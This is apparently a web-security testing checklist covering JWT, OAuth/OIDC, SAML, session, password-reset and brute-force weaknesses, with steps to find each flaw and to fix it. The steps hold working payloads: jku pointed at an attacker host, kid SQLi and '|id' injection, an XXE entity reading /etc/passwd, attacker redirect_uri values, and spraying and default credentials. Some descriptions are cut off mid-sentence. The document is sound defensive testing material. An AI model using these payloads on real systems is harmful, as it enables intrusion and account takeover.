items.description: Missing aud checks let a token minted for one service be replayed against another.
items.how_to_find:
1) Decode the token and note the aud claim (which service it was minted for).
2) Take a token issued for service/app A and replay it against service/app B (common with shared IdPs / multiple resource servers).
3) If B accepts it, aud isn't validated - a token can be reused across audiences (token replay / privilege crossing).
4) Also tamper aud to an unexpected value and see if it's still accepted.
items.how_to_fix: Each resource server must validate that aud matches its own identifier and reject tokens minted for other audiences; also validate iss and scope. VERIFY a token with a foreign/absent aud is rejected.

items.title: Verify issuer (iss) validation
items.description: If iss is not validated, a token from an attacker-controlled issuer may be trusted.
items.how_to_find:
1) Decode the token and note the iss claim.
2) Mint/forge a token with a different iss (attacker-controlled) - if you can also control the key (weak secret, jku/jwk injection) - and replay.
3) Tamper iss to an unexpected value and see whether the server still trusts it.
4) If iss isn't checked against an allow-list, tokens from untrusted issuers may be accepted.
items.how_to_fix: Validate iss against a strict allow-list of trusted issuers and only fetch signing keys from issuer-pinned, allow-listed endpoints; reject unknown issuers. VERIFY a token with an untrusted iss is rejected.

items.title: Test token replay protection
items.description: A captured token replayed from another context should be detectable for sensitive operations.
items.how_to_find:
1) Capture a valid token and replay it from a different context (another IP/User-Agent/device) - it should still work for normal requests (stateless), but SENSITIVE operations should have extra protection.
2) For high-value actions, check for a nonce/jti one-time use, DPoP/token-binding, or re-auth - replay the exact request twice and see if both succeed.
3) Test whether a stolen token remains usable after logout/password change.
4) Unrestricted replay of sensitive actions = weakness.
items.how_to_fix: Add replay defenses for sensitive operations: one-time jti/nonce tracking, sender-constrained tokens (DPoP / mTLS token binding), short lifetimes, and step-up re-authentication; invalidate tokens on logout/password change. VERIFY a replayed sensitive request is rejected.

items.title: Check for sensitive data in the payload
items.description: JWT payloads are base64url-encoded, not encrypted — anyone can read them.
items.how_to_find:
1) Base64url-decode the payload (jwt.io / `echo <payload> | base64 -d`) - it is NOT encrypted.
2) Look for sensitive data: passwords, full PII, internal IDs, roles/permissions, secrets, or session data an attacker shouldn't see.
3) Any confidential value present in the readable payload is disclosed to anyone holding the token.
items.how_to_fix: Put only non-sensitive, minimal claims in the JWT payload (remember it's readable); keep sensitive data server-side and reference it by opaque id, or use encrypted tokens (JWE) if confidentiality is required. VERIFY the decoded payload contains no secrets/PII.

items.title: Test token revocation / invalidation
items.description: Stateless JWTs cannot be revoked unless the server maintains a denylist or rotates keys.
items.how_to_fix: Provide real revocation: maintain a server-side denylist (by jti) or short-lived access tokens + revocable refresh tokens, and invalidate on logout/password-change/compromise (e.g. bump a per-user token version or rotate keys). VERIFY a revoked/post-logout token is rejected server-side.
items.how_to_find:
1) Log in to get a token, then perform an action that SHOULD invalidate it (logout, password change, admin revoke, role change).
2) Replay the OLD token afterward - if it still works, the JWT can't actually be revoked (stateless tokens live until exp).
3) Check whether logout only clears the client (cookie/localStorage) but the token remains valid server-side.
4) Persistent validity after revocation = finding.

items.title: Assess signing-key rotation
items.description: Long-lived static signing keys widen the blast radius of a key compromise.
items.how_to_find:
1) Inspect the JWKS (/.well-known/jwks.json) and token headers for a kid - see whether multiple keys exist and rotate over time.
2) Check whether old tokens keep validating indefinitely (no rotation) and whether revoked/old keys are removed from JWKS.
3) Note static/long-lived keys hardcoded in config - a leak means every past/future token is forgeable until manual change.
4) Confirm the verifier accepts only current keys, not arbitrary/retired ones.
items.how_to_fix: Rotate signing keys regularly and support overlapping keys via kid + JWKS so rotation is seamless; retire/remove old keys promptly, store keys in a KMS/secret manager, and be able to rotate immediately on compromise. VERIFY tokens signed with a retired key are rejected.

items.title: Test for JWK header injection
items.description: A server that trusts an embedded jwk header will verify the token against an attacker-supplied key.
items.how_to_find:
1) In the JWT header, inject a self-generated public key via the jwk parameter and sign the token with your matching private key:
   jwt_tool <jwt> -X i   (embedded JWK injection) or Burp JWT Editor 'Embedded JWK' attack.
2) Modify claims (e.g. role=admin) and replay - if the server verifies against the attacker-supplied jwk, the forged token is accepted.
3) This works when the library trusts a key embedded in the token header.
items.how_to_fix: Never trust keys supplied in the token (jwk/x5c header): verify only against a server-side trusted key/JWKS resolved by a pinned issuer and allow-listed kid. Disable embedded-key acceptance in the JWT library. VERIFY a token with an embedded jwk is rejected.

items.title: Test for JKU header abuse
items.description: If the jku (JWK Set URL) is not allowlisted, the server can be pointed at an attacker-hosted key set.
items.how_to_fix: Allow-list the exact jku/JWKS URL(s) (pinned to the trusted issuer) and ignore any jku in the token; fetch keys only from your own trusted endpoint over TLS. This also closes the SSRF vector. VERIFY a token pointing jku at an attacker host is rejected.
items.how_to_find:
1) Host your own JWK Set at an attacker-controlled URL containing a public key you own.
2) Set the token header's jku to that URL, sign the (modified) token with your private key, and replay:
   jwt_tool <jwt> -X s -ju http://attacker/jwks.json   (or Burp JWT Editor).
3) If the server fetches your JWKS and validates against it, your forged token is accepted (also an SSRF primitive - point jku at internal URLs).
4) Try open-redirect/allow-list bypasses if jku is partially validated.

items.title: Test for kid header injection
items.description: The kid header may be used in path traversal, SQLi, or command injection when it selects the key.
items.how_to_find:
1) The kid header often selects a key by file path or DB lookup - test it as an injection point:
   - Path traversal / predictable file: set kid to '../../dev/null' and sign with an empty/known key (a common alg:none-like bypass), or point to a file with known contents.
   - SQLi: kid = ' UNION SELECT 'attacker-secret'-- to make the DB return a key you control, then sign with it.
   - Command injection: kid = '|id' if the value hits a shell.
2) jwt_tool <jwt> -I -hc kid -hv '../../../dev/null' helps craft these.
3) Successful forgery/traversal/SQLi via kid = finding.
items.how_to_fix: Treat kid as untrusted input: look up keys via a strict allow-list/map (never build file paths, SQL, or shell commands from it), parameterize any DB lookup, and reject unknown kids. VERIFY traversal/SQLi payloads in kid don't select an attacker-controlled key.

items.title: Assess token storage security
items.description: Tokens in localStorage are exposed to any XSS; httpOnly cookies are not.
items.how_to_find:
1) In DevTools, check where the token lives: Application > Local Storage / Session Storage / Cookies.
2) localStorage/sessionStorage tokens are readable by ANY JavaScript - any XSS steals them (`localStorage.getItem('token')`). Cookies without HttpOnly are equally exposed.
3) Confirm by running a test JS snippet in the console to read the token.
4) Token in JS-accessible storage = high XSS-to-ATO risk.
items.how_to_fix: Prefer storing session tokens in HttpOnly + Secure + SameSite cookies (unreadable by JS) rather than localStorage; keep tokens short-lived, and - most importantly - eliminate XSS (output encoding, CSP). VERIFY the token is not accessible via document.cookie/localStorage from JS.

items.title: Test refresh-token security
items.description: Weak refresh-token handling enables persistent account takeover.
items.how_to_fix: Make refresh tokens revocable and rotating: single-use with rotation + reuse-detection (revoke the family on replay), store them httpOnly/Secure, bind to client/device, expire them, and invalidate on logout/password-change. VERIFY a reused/old refresh token is rejected and revocation works.
items.how_to_find:
1) Capture the refresh token and the /refresh (token renewal) endpoint.
2) Test rotation & reuse detection: use a refresh token once, then replay the SAME token - if it still issues new access tokens, there's no rotation/one-time-use.
3) Test lifetime (does it ever expire?), revocation (still works after logout/password change?), and binding (usable from another device/IP?).
4) Test the endpoint for IDOR (swap user id) and brute force. Long-lived, non-rotating, non-revocable refresh tokens = persistent ATO.

items.title: Assess access-token lifetime
items.description: Over-long access tokens magnify the impact of token theft.
items.how_to_find:
1) Decode the access token and compute (exp - iat) to get its lifetime.
2) Long lifetimes (hours/days/never) mean a stolen token stays usable for that whole window.
3) Confirm the server actually enforces exp (capture, wait, replay).
4) Very long-lived access tokens (vs short access + refresh) magnify theft impact.
items.how_to_fix: Keep access tokens short-lived (minutes, e.g. 5-15) and use rotating refresh tokens for continuity; scope tokens minimally. Enforce exp server-side. VERIFY access tokens expire quickly and can't be used long after issuance.

items.title: Test logout handling for tokens
items.description: If logout only clears the client, a captured token still works server-side.
items.how_to_fix: Make logout server-side effective: revoke the refresh token and add the access token's jti to a denylist until exp (or bump a per-user token version), and clear the httpOnly cookie. VERIFY the pre-logout token is rejected after logout.
items.how_to_find:
1) Log in, capture a valid token, then click logout.
2) Replay the OLD token (from before logout) to a protected endpoint - if it still works, logout only cleared the client and the token is still valid server-side.
3) Also confirm the cookie is actually cleared/invalidated (not just removed client-side).
4) Token valid after logout = finding (stolen tokens survive logout).

items.title: Verify cookie security flags for token cookies
items.description: A token stored in a cookie needs HttpOnly, Secure, and SameSite to resist theft and CSRF.
items.how_to_find:
1) Inspect the Set-Cookie for the token cookie (DevTools > Application > Cookies, or the response headers).
2) Check the flags: HttpOnly (blocks JS theft via XSS), Secure (HTTPS-only, blocks network sniffing), SameSite=Lax/Strict (blocks CSRF).
3) Missing HttpOnly -> read it via document.cookie in the console; missing Secure -> observe it sent over http; SameSite=None without need -> CSRF exposure.
4) Note the exact missing flag(s).
items.how_to_fix: Set HttpOnly, Secure, and an appropriate SameSite (Lax/Strict) on token cookies, scope Path/Domain tightly, use a short Max-Age, and add __Host- prefix where possible; rotate on privilege change and invalidate server-side on logout. VERIFY the cookie carries HttpOnly+Secure+SameSite and isn't JS-readable.

items.title: Test redirect_uri validation
items.description: Loose redirect_uri matching lets an attacker steal authorization codes/tokens.
items.how_to_fix: Exact-match redirect_uri server-side against a pre-registered allow-list (full string incl. path; no wildcards/prefix/substring matching), reject open redirects/path traversal, and bind the code to the redirect_uri at token exchange. Use PKCE. VERIFY codes/tokens can't be delivered to a non-registered URI.
items.how_to_find:
1) Capture the /authorize request and tamper redirect_uri to attacker-controlled variants:
   - different host: https://attacker.tld
   - subdomain/suffix tricks: https://target.tld.attacker.tld, https://attacker.tld?x=target.tld
   - path append/traversal: https://target.tld/callback/../../evil, //attacker.tld, open-redirect on the allowed host.
2) If the AS redirects the code/token to your URI (or via an open redirect on the trusted host), you steal the authorization code/token = account takeover.
3) Also test whether redirect_uri is validated at token exchange, not just at /authorize.

items.title: Verify the state parameter (CSRF on OAuth)
items.description: A missing/unchecked state parameter allows login CSRF and account linking attacks.
items.how_to_find:
1) Start an OAuth login and inspect /authorize for a state parameter.
2) Remove state, or replay/fix it, and complete the flow - if the callback is accepted without validating state against the user's session, it's vulnerable.
3) Exploit: capture your own valid callback (code+state) and trick a victim into visiting it -> the victim's account gets linked to/logged into the attacker's IdP account (login CSRF / account linking).
4) No state, predictable state, or state not tied to session = finding.
items.how_to_fix: Generate a cryptographically random, per-request state, bind it to the user's session, and reject callbacks where state is missing or mismatched (single-use). Combine with SameSite cookies and PKCE. VERIFY a callback with missing/foreign state is rejected.

items.title: Check for PKCE on public clients
items.description: Authorization-code flows without PKCE are vulnerable to code interception.
items.how_to_find:
1) Inspect the /authorize request from a public client (SPA/mobile) for code_challenge and code_challenge_method=S256.
2) If absent, the auth-code flow lacks PKCE - an intercepted authorization code (e.g. via redirect leak, malicious app) can be exchanged for tokens.
3) Test whether the token endpoint accepts a code exchange WITHOUT a code_verifier, or with a wrong verifier (downgrade).
4) Missing/unenforced PKCE on public clients = finding.
items.how_to_fix: Require PKCE (S256) for all public clients and enforce code_verifier validation at the token endpoint (reject exchanges lacking/failing the verifier); disable the plain method. VERIFY a code can't be exchanged without the correct code_verifier.

items.title: Flag use of the deprecated implicit flow
items.description: The implicit flow returns tokens in the URL fragment and is discouraged by the security BCP.
items.how_to_find:
1) Check the /authorize request for response_type=token (or id_token token) - that's the implicit flow, which returns tokens in the URL fragment.
2) Tokens in the fragment leak via browser history, Referer, and any JS on the page, and there's no PKCE/client auth.
3) Confirm the AS still supports implicit for this client (try response_type=token).
4) Use of implicit flow = finding (discouraged by OAuth 2.0 Security BCP).
items.how_to_fix: Migrate to the authorization-code flow with PKCE (response_type=code) and disable the implicit grant for the client at the authorization server. VERIFY response_type=token is rejected.

items.title: Test scope handling and upgrade
items.description: Scope that is not validated server-side can be escalated by the client/attacker.
items.how_to_find:
1) At /authorize or the token exchange, tamper the scope parameter to add privileges (e.g. add 'admin', 'write', extra APIs) beyond what the client is entitled to.
2) At the /token endpoint (refresh or code exchange), request a broader scope than originally granted (scope upgrade).
3) If the AS issues a token with the escalated scope, or the resource server honors an unrequested scope, it's broken.
4) Also check that the resource server enforces scope per-endpoint, not just presence of a valid token.
items.how_to_fix: Validate requested scopes server-side against what the client and user are authorized for; never grant more than granted, don't allow scope upgrade on refresh, and enforce scope checks at each resource-server endpoint. VERIFY escalated/unrequested scopes are refused.

items.title: Check for token/code leakage via Referer
items.description: Codes/tokens in URLs can leak to third parties through the Referer header.
items.how_to_fix: Deliver codes/tokens via the code flow (short-lived, single-use codes), set Referrer-Policy: no-referrer on OAuth pages, avoid third-party content/links on the callback page, keep tokens out of URLs, and bind codes to client+redirect_uri+PKCE so a leaked code is useless. VERIFY no code/token appears in Referer to third parties.
items.how_to_find:
1) Complete the OAuth flow and watch the callback URL - if it contains code=/access_token= in the query/fragment, check what loads on that page (third-party scripts, images, links).
2) Click an external link or trigger an outbound request from the callback page and inspect the Referer header (Burp) - if it carries the code/token, it leaks to third parties.
3) Also check browser history and server logs for the token/code in URLs.
4) Leaked code still valid (not single-use / not PKCE-bound) = exploitable.

items.title: Verify id_token signature validation
items.description: An unvalidated id_token signature lets an attacker forge identity claims (inherits all JWT signature attacks).
items.how_to_find:
1) Capture the id_token (a JWT) returned by the OP and run all JWT signature attacks against the RP's validation: alg=none, RS256->HS256 confusion, weak secret, jwk/jku/kid injection (jwt_tool).
2) Tamper identity claims (sub, email) and replay - if accepted, the RP doesn't verify the signature against the OP's JWKS.
3) Verify the RP fetches keys from the OP's pinned JWKS (not from the token) and matches kid.
4) Any forged id_token accepted = full identity spoofing.
items.how_to_fix: Validate the id_token signature against the OP's published JWKS with a pinned issuer and expected algorithm (no alg=none, no token-supplied keys); use a vetted OIDC library. VERIFY a tampered/forged id_token is rejected.

items.title: Verify nonce binding
items.description: The nonce binds the id_token to the authentication request and prevents replay.
items.how_to_find:
1) Check that the RP sends a nonce in the /authorize request and that the returned id_token contains a matching nonce claim.
2) Replay an old id_token (from a previous auth) or one with a different/absent nonce - if the RP accepts it, nonce isn't validated (replay/injection possible).
3) Test whether the nonce is bound to the user's session (not a fixed/predictable value).
4) Missing/unchecked nonce = id_token replay finding.
items.how_to_fix: Generate a random per-request nonce, bind it to the session, and reject id_tokens whose nonce claim is missing or doesn't match. VERIFY a replayed/nonce-mismatched id_token is rejected.

items.title: Test aud/azp and email_verified claim trust
items.description: RPs that trust unverified claims (e.g. Good hygiene that pays off over time.
items.how_to_fix: Validate aud (must equal this RP's client_id) and azp where present, and only trust email/identity claims when email_verified is true; match accounts on a stable verified identifier (sub@issuer), never on an unverified email. VERIFY tokens with wrong aud or unverified email don't grant access/linking.
items.how_to_find:
1) Decode the id_token and check whether the RP validates aud == its own client_id and azp (authorized party) for multi-client setups - a token minted for another client shouldn't be accepted.
2) Test email_verified trust: if the RP links/logs-in based on the email claim, try an OP account with email_verified=false (or a claim you can influence) matching a victim's email -> account takeover via unverified email.
3) Also test sub swapping and provider-supplied claims the RP trusts blindly.

items.title: Review the discovery / .well-known configuration
items.description: The OIDC discovery document can reveal endpoints, supported algs (incl.
items.how_to_find:
1) Fetch the discovery document: curl -s https://issuer/.well-known/openid-configuration | jq .
2) Review it for weak posture: id_token_signing_alg_values_supported including 'none'/'HS256', implicit/hybrid grants, missing PKCE (code_challenge_methods_supported), exposed admin/registration endpoints, and any internal URLs.
3) Grab jwks_uri and inspect keys; note token/authorization/userinfo endpoints for further testing.
4) Weak algs/flows advertised = exploitable configuration.
items.how_to_fix: Harden the OP config: advertise only strong signing algs (drop 'none'/HS where inappropriate), disable implicit/deprecated grants, require PKCE, restrict dynamic client registration, and don't expose internal endpoints in discovery. VERIFY the discovery doc lists only secure algs/flows.

items.title: Test SAML response/assertion signature validation
items.description: Unsigned or unverified assertions allow forged authentication.
items.how_to_find:
1) Intercept the SAMLResponse (base64/deflate) with Burp + the SAML Raider extension; decode it.
2) Tamper the assertion (change NameID/attributes to a victim/admin) and:
   - strip the Signature element entirely and resend (unsigned-acceptance test)
   - remove/alter the signature and see if the SP still accepts it.
3) If the SP processes the modified assertion, signatures aren't validated = forged authentication.
4) Confirm the SP validates the signature over the correct (assertion) element with the trusted IdP cert.
items.how_to_fix: Require and cryptographically validate the XML signature on the Response/Assertion against the trusted IdP certificate (reject unsigned/invalid), ensure the signature covers the processed assertion, and pin the IdP cert. Use a hardened SAML library. VERIFY a modified/unsigned assertion is rejected.

items.title: Test for XML Signature Wrapping (XSW)
items.description: XSW moves the signed element while injecting an attacker-controlled assertion the SP actually processes.
items.how_to_fix: Use a SAML library that validates the signature and processes the SAME element that was signed (schema-hardened, ID/reference-checked, single-assertion), reject documents with multiple/ambiguous assertions, and process only signed elements. VERIFY all XSW variants are rejected.
items.how_to_find:
1) With SAML Raider (Burp), take a validly-signed SAMLResponse and apply the built-in XSW attack templates (XSW1-8): they move the original signed assertion (e.g. into a wrapper/extension) and inject an attacker-controlled assertion with victim/admin claims.
2) Resend each variant - if the SP validates the signature on the original element but PROCESSES the injected unsigned assertion, you authenticate as the victim.
3) Try different positions/IDs since SPs mishandle them differently.
4) Any accepted XSW variant = authentication bypass.

items.title: Test for XML comment injection in NameID
items.description: Comment injection can cause the SP to parse only part of the NameID, impersonating another user.
items.how_to_find:
1) In the assertion's NameID, inject an XML comment inside a victim's identifier, e.g. <NameID>admin@target.tld<!---->.attacker@evil.tld</NameID> (or admin<!---->@target.tld).
2) Some XML parsers return only the text node before/after the comment, so the SP reads 'admin@target.tld' while the signature still validates over the whole (attacker-registered) value.
3) Log in and see whose account you land in - if it's the victim, comment truncation impersonation works.
4) Try comments at various positions in NameID/attributes.
items.how_to_fix: Use an XML/SAML library that normalizes text nodes and isn't affected by comment truncation (patched canonicalization), extract NameID via a single normalized string, and match users on the fully-validated value. VERIFY comment-injected NameIDs don't impersonate another user.

items.title: Verify assertion conditions (audience, validity window, recipient)
items.description: Ignoring NotBefore/NotOnOrAfter, AudienceRestriction, or Recipient enables replay and cross-SP reuse.
items.how_to_find:
1) Decode the assertion and check the SP enforces: NotBefore/NotOnOrAfter (validity window), AudienceRestriction (this SP's entityID), Recipient, and InResponseTo.
2) Replay an OLD assertion after NotOnOrAfter - if accepted, the window isn't enforced (replay).
3) Replay an assertion minted for ANOTHER SP (wrong Audience) - if accepted, cross-SP reuse works.
4) Also test one-time-use (replay the same assertion twice) and InResponseTo binding.
items.how_to_fix: Strictly enforce all assertion conditions server-side: validity window (with small skew), AudienceRestriction == this SP, Recipient/Destination, InResponseTo matching a pending request, and single-use (track assertion IDs). VERIFY expired/foreign-audience/replayed assertions are rejected.

items.title: Test the SAML parser for XXE
items.description: SAML is XML; a parser that resolves external entities is vulnerable to XXE.
items.how_to_find:
1) Inject an XXE payload into the SAMLResponse XML (via SAML Raider/Burp), e.g. add a DOCTYPE with an external entity:
   <!DOCTYPE x [<!ENTITY xxe SYSTEM "http://BURP-COLLAB">]> and reference &xxe; in a field.
2) Watch Burp Collaborator for an out-of-band callback (blind XXE) or the response for file contents (file:///etc/passwd).
3) A callback/file read confirms the SP's XML parser resolves external entities = XXE (SSRF/file disclosure).
4) Also test parameter/DTD variants.
items.how_to_fix: Disable DTDs and external entity resolution in the SAML XML parser (secure-processing, disallow-doctype-decl, no external general/parameter entities), keep the library patched, and don't reflect parsed content. VERIFY the XXE payload triggers no callback/file read.

items.title: Test for session fixation
items.description: If the session id is not rotated on login, an attacker-fixed id survives authentication.
items.how_to_find:
1) Before login, note the session cookie value (set one yourself if the app accepts it - e.g. via URL param or a pre-auth Set-Cookie).
2) Log in with valid creds and compare the session id AFTER authentication - if it's unchanged, the app doesn't rotate on login (session fixation).
3) Exploit: fix a victim's session id (link/XSS), have them log in, then reuse that same id to ride their authenticated session.
4) Same pre/post-login id = finding.
items.how_to_fix: Regenerate the session id on every privilege change (login, MFA step-up, role change), don't accept client-supplied session ids, and set HttpOnly+Secure+SameSite. VERIFY the session id changes after login.

items.title: Verify session cookie attributes
items.description: Session cookies need HttpOnly, Secure, and SameSite to resist theft and CSRF.
items.how_to_find:
1) Inspect the Set-Cookie for the session cookie (DevTools > Application > Cookies or response headers).
2) Check flags: HttpOnly (blocks JS/XSS theft), Secure (HTTPS-only), SameSite=Lax/Strict (blocks CSRF).
3) Missing HttpOnly -> read via document.cookie in console; missing Secure -> observe over http; SameSite=None without need -> CSRF risk.
4) Record the exact missing flag(s).
items.how_to_fix: Set HttpOnly, Secure, and SameSite (Lax/Strict) on session cookies, scope Path/Domain tightly, prefer the __Host- prefix, and use a short lifetime; rotate on privilege change and invalidate server-side on logout. VERIFY the cookie carries HttpOnly+Secure+SameSite and isn't JS-readable.

items.title: Assess session-id entropy and predictability
items.description: Predictable session ids can be guessed or brute-forced.
items.how_to_find:
1) Collect many session ids (log in/out repeatedly or open many sessions) and analyze them with Burp Sequencer for randomness/entropy.
2) Look for patterns: sequential/incrementing values, timestamps, encoded usernames, short length, or base64 that decodes to predictable data.
3) Low entropy/predictable structure means ids can be guessed or brute-forced to hijack sessions.
4) Burp Sequencer 'poor'/low bits-of-entropy verdict = finding.
items.how_to_fix: Generate session ids from a CSPRNG with >=128 bits of entropy, use the framework's vetted session manager (don't roll your own or encode data into the id), and make ids opaque and long. VERIFY session ids are high-entropy and unpredictable (Burp Sequencer).

items.title: Test idle and absolute session timeout
items.description: Sessions that never expire leave stolen tokens valid indefinitely.
items.how_to_find:
1) Idle timeout: log in, leave the session unused for a while, then send an authenticated request - if it still works after a long idle period, there's no idle timeout.
2) Absolute timeout: keep a session active and see whether it ever forcibly expires (e.g. after 8-24h) requiring re-login.
3) Test that expiry is enforced SERVER-SIDE (the old cookie is rejected), not just a client-side redirect.
4) No/very long timeouts = stolen sessions stay valid indefinitely.
items.how_to_fix: Enforce both an idle timeout (e.g. 15-30 min) and an absolute timeout server-side, invalidating the session record so old cookies are rejected; use shorter timeouts for sensitive apps. VERIFY a session is rejected after the idle/absolute limit.

items.title: Verify server-side session termination on logout
items.description: Logout must invalidate the session server-side, not just clear the client cookie.
items.how_to_find:
1) Log in, capture the session cookie, then log out.
2) Replay a request with the OLD cookie value (Repeater) - if it still authenticates, logout only cleared the client and the session lives server-side.
3) Confirm the server actually destroys the session record (not just Set-Cookie deletion).
4) Valid session after logout = finding (stolen cookies survive logout).
items.how_to_fix: On logout, destroy the session server-side (invalidate the session record/id) so the old cookie is rejected, and clear the cookie client-side; also offer 'log out all sessions'. VERIFY the pre-logout cookie is rejected after logout.

items.title: Test concurrent-session handling
items.description: Unbounded concurrent sessions can hide account compromise and complicate revocation.
items.how_to_find:
1) Log in as the same user from multiple browsers/devices simultaneously and see whether all sessions stay valid.
2) Check whether the app: caps concurrent sessions, shows an active-sessions list, and lets the user revoke others.
3) Change the password in one session and verify whether OTHER sessions are invalidated - if not, a thief keeps access after remediation.
4) Unlimited, non-revocable concurrent sessions = finding.
items.how_to_fix: Provide a session inventory with per-session revoke and 'log out everywhere', invalidate other sessions on password change/compromise, and optionally cap or alert on concurrent sessions from new devices/locations. VERIFY other sessions can be revoked and die on password change.

items.title: Test reset-token strength and expiry
items.description: Predictable or long-lived reset tokens enable account takeover.
items.how_to_find:
1) Trigger several password resets and collect the tokens from the emails/URLs; analyze them (Burp Sequencer) for entropy and structure - sequential, timestamp-based, short, or username-derived = predictable.
2) Test expiry: use a token well after issuance to see if it still works (should be short-lived, e.g. 15-60 min).
3) Test single-use: use a token, then reuse it.
4) Test that the token is bound to the requesting account (can't use user A's token to reset user B). Predictable/long-lived/reusable tokens = ATO.
items.how_to_fix: Generate reset tokens from a CSPRNG (>=128 bits), make them single-use, short-lived, and bound to the account; invalidate on use/new-request and after password change; rate-limit requests. VERIFY tokens are unpredictable, expire, and can't be reused or cross-account.

items.title: Test for password-reset poisoning (Host header)
items.description: If reset links are built from the Host header, an attacker can poison them to capture tokens.
items.how_to_fix: Build reset links from a server-side configured base URL (not request headers), validate/allow-list the Host header, and ignore X-Forwarded-Host for link generation. VERIFY the reset link always points to the canonical domain regardless of Host/X-Forwarded-Host.
items.how_to_find:
1) In the forgot-password request, change the Host header (or add X-Forwarded-Host: attacker.tld) while requesting a reset for a victim.
2) Check the resulting reset email - if the link's domain is attacker.tld (Host reflected into the link), then when the victim clicks it their token is sent to you = account takeover.
3) Also test X-Forwarded-Host, X-Host, and absolute-URI request line.
4) Attacker-controlled domain in the reset link = finding.

items.title: Check for reset-token leakage via Referer
items.description: A token in the reset URL can leak to third parties via the Referer header when the page loads external resources.
items.how_to_find:
1) Open a real reset link (token in the URL) and inspect what the page loads: third-party scripts, images, analytics, or external links.
2) Trigger an outbound request (click an external link / let a third-party resource load) and check the Referer header (Burp) - if it carries the full reset URL incl. token, it leaks the token to third parties.
3) Also check browser history/logs. If the leaked token is still valid, it's exploitable ATO.
items.how_to_fix: Keep the token out of the URL where possible (POST/one-time exchange), set Referrer-Policy: no-referrer on reset pages, avoid third-party resources/links there, and make tokens single-use + short-lived so a leaked token is useless. VERIFY the token doesn't appear in Referer to third parties.

items.title: Assess knowledge-based recovery (security questions)
items.description: Security questions are often guessable or OSINT-derivable and weaken recovery.
items.how_to_find:
1) Review the security questions offered - many (mother's maiden name, birth city, first school) are OSINT-derivable or guessable from social media.
2) Test whether answers alone reset the password (no email/OTP), whether attempts are rate-limited/lockable, and whether answers are matched case-insensitively/loosely (easier to brute).
3) Try enumerating/brute-forcing answers on a test account.
4) Questions as a sole recovery factor = weak ATO path.
items.how_to_fix: Avoid knowledge-based questions as an authentication factor; use email/SMS/authenticator-based recovery with rate limiting instead. If unavoidable, treat them as secondary only, rate-limit/lock attempts, and don't reveal validity. VERIFY security-question answers alone can't reset an account.

items.title: Test brute-force and rate-limit protections
items.description: Weak throttling allows credential stuffing and password spraying.
items.how_to_find:
1) In Burp Intruder (or ffuf), send many login attempts for one account with a password list and watch for lockout/throttling.
2) Test credential stuffing (many user:pass pairs) and password spraying (one common password across many users).
3) Note the threshold, whether lockout/CAPTCHA/delay ever kicks in, and whether the API/mobile endpoints lack the web UI's protection.
4) No lockout/throttling after dozens of failures = finding.
items.how_to_fix: Throttle failed logins server-side (progressive delay/temporary lockout), add CAPTCHA/step-up after repeated failures, apply limits per-account AND per-IP, enforce breached-password blocking + MFA, and alert on spikes. Apply to all auth endpoints (web/API/mobile). VERIFY brute forcing is stopped after a few failures.

items.title: Test for rate-limit bypass
items.description: Header tricks and casing variations often bypass naive IP/username throttling.
items.how_to_find:
1) Once a limit is found, try to bypass it: rotate spoofable headers (X-Forwarded-For, X-Real-IP, X-Client-IP, True-Client-IP) with different values per request.
2) Vary the username case/format (Admin vs admin, trailing space/dot, email alias) to defeat per-username counters.
3) Change path case/encoding, add dummy params, switch HTTP/1.1<->HTTP/2, or use parallel requests (race) to slip past.
4) Any technique that resets/evades the counter = bypass finding.
items.how_to_fix: Enforce limits server-side on a trustworthy key (authenticated account + real connection IP, not client headers), normalize usernames before counting, and make limits path/case/encoding-insensitive; protect against concurrent-request races. VERIFY the limit can't be bypassed via headers or username normalization tricks.

items.title: Test for username/account enumeration
items.description: Enumeration enables targeted credential attacks.
items.how_to_find:
1) Compare responses for a VALID vs INVALID username across login, registration, forgot-password, and OTP flows.
2) Look for differences: error text ('user not found' vs 'wrong password'), HTTP status, response length, redirect, and response TIMING (valid users often take longer due to hashing).
3) Also check registration ('email already exists') and reset ('if the account exists...' vs explicit).
4) Any observable difference = username enumeration.
items.how_to_fix: Return identical, generic responses (message, status, and timing) for valid and invalid accounts on login/reset/registration; use constant-time comparisons and dummy hashing for unknown users, and rate-limit these endpoints. VERIFY valid and invalid usernames are indistinguishable.

items.title: Check for default and weak credentials
items.description: Default creds on admin/management interfaces lead directly to full compromise.
items.how_to_find:
1) Enumerate admin/management interfaces (app admin, /manager, CMS, DB consoles, appliances, routers) and try vendor default creds:
   admin/admin, admin/password, root/root, admin/<blank>, and product-specific defaults (check the vendor docs / SecLists default-passwords).
2) Also try weak/obvious creds tied to the org (company name, 2024/2025 seasons).
3) A successful default/weak login on any privileged interface = direct compromise.
4) Include third-party components and their admin panels.
items.how_to_fix: Remove/disable default accounts and force a strong password change on first use; don't ship default creds, restrict admin interfaces (network allow-list/VPN), and add MFA + monitoring. VERIFY no default/weak credentials work on any interface.

items.title: Test for weak passwords via spraying
items.description: Password spraying a few common passwords across many accounts evades per-account lockout.
items.how_to_fix: Block common/breached passwords at set-time, enforce MFA, and detect spraying (rate-limit + alert on many accounts failing the same password, per-IP and globally, not just per-account). VERIFY a common password can't be set and spraying is detected/blocked.
items.how_to_find:
1) Gather a valid username list (from enumeration), then try ONE common password (e.g. 'Winter2025!', 'Company@123') across ALL of them - low per-account attempts evade lockout.
2) Cycle through a few passwords slowly across the whole user base (password spraying).
3) Watch for successful logins and for whether the app detects the horizontal pattern.
4) Any account cracked, or no global spray detection, = finding.

items.title: Verify credentials are sent only over TLS
items.description: Credentials over HTTP are trivially intercepted.
items.how_to_find:
1) In Burp, watch the login/registration/reset submissions - confirm they go over HTTPS, never plain HTTP.
2) Try loading the login page over http:// and see if creds can be posted without TLS (or if there's no HTTPS redirect/HSTS).
3) Check for mixed content (page https but form action http) and credentials sent in URL query strings (logged/cached).
4) Any credential transmitted over HTTP / in a URL = finding.
items.how_to_fix: Serve the entire app over HTTPS, redirect HTTP->HTTPS, enable HSTS (preload), submit credentials only via POST body over TLS (never in URLs), and eliminate mixed content. VERIFY credentials are never sent over HTTP or in query strings.

items.title: Check sensitive fields for caching/autocomplete exposure
items.description: Cached or autocompleted credentials on shared machines leak secrets.
items.how_to_find:
1) Inspect sensitive inputs (password, card number, SSN) for autocomplete attributes and whether the browser offers to save/refill them.
2) Check response headers on authenticated/sensitive pages for caching directives - missing Cache-Control: no-store means pages can be cached to disk (retrievable on shared machines / via back button after logout).
3) After logout, press Back and see if sensitive data is still shown from cache.
4) Cached sensitive pages / autofilled secrets = finding.
